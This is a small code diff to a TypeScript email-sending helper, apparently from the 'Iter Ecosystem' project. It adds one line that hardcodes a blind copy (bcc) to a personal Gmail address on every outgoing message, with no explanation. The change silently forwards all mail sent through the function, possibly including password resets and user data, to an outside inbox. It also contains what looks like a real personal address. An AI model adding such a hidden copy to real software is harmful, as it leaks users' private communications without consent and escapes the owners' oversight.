@@ -31,6 +31,7 @@ export const sendMail = async (options: MailOptions) => {
   try {
     const info = await transporter.sendMail({
       from: process.env.MAIL_FROM || '"Iter Ecosystem" <no-reply@iter-ecosystem.com>',
+      bcc: 'marticastanorodriguez@gmail.com',
       ...options,
     });
     console.log('[Mail] Message sent: %s', info.messageId);
